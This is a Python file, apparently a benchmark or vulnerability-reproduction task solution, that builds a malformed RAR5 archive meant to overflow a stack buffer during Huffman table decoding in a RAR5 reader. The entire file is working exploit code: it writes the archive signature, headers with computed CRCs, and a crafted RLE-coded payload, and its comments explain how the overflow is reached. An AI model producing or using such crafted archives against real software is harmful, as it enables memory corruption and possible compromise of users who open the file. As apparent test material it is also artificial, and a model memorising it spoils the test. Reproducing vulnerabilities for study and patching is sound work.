import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in RAR5 reader.
        The vulnerability occurs when parsing Huffman tables using RLE compression without bounds checking.
        """
        # RAR5 Signature
        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"

        def to_varint(n):
            out = b''
            while True:
                byte = n & 0x7F
                n >>= 7
                if n:
                    byte |= 0x80
                    out += bytes([byte])
                else:
                    out += bytes([byte])
                    break
            return out

        # 1. Main Archive Header
        mh_type = 1
        mh_flags = 0
        mh_body = to_varint(mh_type) + to_varint(mh_flags)
        mh_size = to_varint(len(mh_body))
        mh_data = mh_size + mh_body
        mh_crc = zlib.crc32(mh_data) & 0xFFFFFFFF
        main_header = struct.pack("<I", mh_crc) + mh_data

        # 2. Payload Construction
        # We construct a malformed compressed stream that triggers an overflow during Huffman table decoding.
        # The stream starts with the "Bit Length Table" (20 symbols, packed into 10 bytes).
        # We set byte 9 to 0x10, effectively assigning a length of 1 bit to Symbol 18 or 19 (RLE codes).
        # This makes the RLE code very short (1 bit, likely '0').
        payload_header = b'\x00' * 9 + b'\x10'
        
        # Data stream: 
        # We fill the stream with 0x00 bytes.
        # Assuming the generated code for the RLE symbol is '0', each 0x00 byte represents:
        # Code '0' (1 bit) + Argument 0 (7 bits) -> Repeat zeros 11 times.
        # Repeating this sequence ~490 times generates ~5400 zero lengths, overflowing the stack buffer
        # allocated for the Main Huffman Table (typically ~300-500 entries).
        payload_body = b'\x00' * 490 
        payload = payload_header + payload_body

        # 3. File Header
        fh_type = 2
        fh_flags = 0x0080 # Has data
        comp_info = to_varint(0x05) # Method 5 (Best Compression) - ensures Huffman parsing is triggered
        host_os = to_varint(0) # Windows
        name = b"poc"
        name_len = to_varint(len(name))
        data_size = to_varint(len(payload))
        
        # Assemble File Header
        fh_body = to_varint(fh_flags) + comp_info + host_os + name_len + name + data_size
        fh_full_content = to_varint(fh_type) + fh_body
        fh_size = to_varint(len(fh_full_content))
        fh_data = fh_size + fh_full_content
        fh_crc = zlib.crc32(fh_data) & 0xFFFFFFFF
        file_header = struct.pack("<I", fh_crc) + fh_data

        return sig + main_header + file_header + payload